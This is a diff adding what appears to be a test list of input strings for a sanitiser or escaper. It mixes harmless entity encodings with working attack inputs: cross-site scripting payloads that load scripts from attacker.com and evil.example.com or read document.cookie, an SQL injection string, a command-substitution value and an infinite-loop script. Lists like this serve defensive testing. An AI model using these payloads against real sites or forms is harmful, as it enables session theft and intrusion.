@@ -1,0 +1,29 @@
+"><x oncontentvisibilityautostatechange=alert?.(1)+style%3dcontent-visibility%3aauto>
+alpha.beta(gamma).delta()
+$(pwd|echo test)
+myFunction?.(123)
+' OR '1'='1'--
+<iframe src=http://evil.example.com/malicious.html>
+<IMG SRC="javascript:prompt('XSS')">
+<SCRIPT SRC=//attacker.com/x.js>
+<SCRIPT SRC=http://attacker.com/xss.js?<A>>
+<<SCRIPT>alert('Injected');//<</SCRIPT>
+<SCRIPT/SRC="http://attacker.com/xss.js"></SCRIPT>
+<BODY onload=alert(document.cookie)>
+<SCRIPT/XSS SRC="http://attacker.com/xss.js"></SCRIPT>
+<IMG SRC=" javascript:alert('XSS'); ">
+&mdash;
+%26mdash%3B
+&amp;
+&amp;amp
+&amp;
+&amp;
+&#45;
+&#045;
+&#0045;
+&#00045;
+&lt;
+%3C
+&lt
+<body><script>while(true);</script></body>
+<!— invalid comment —>
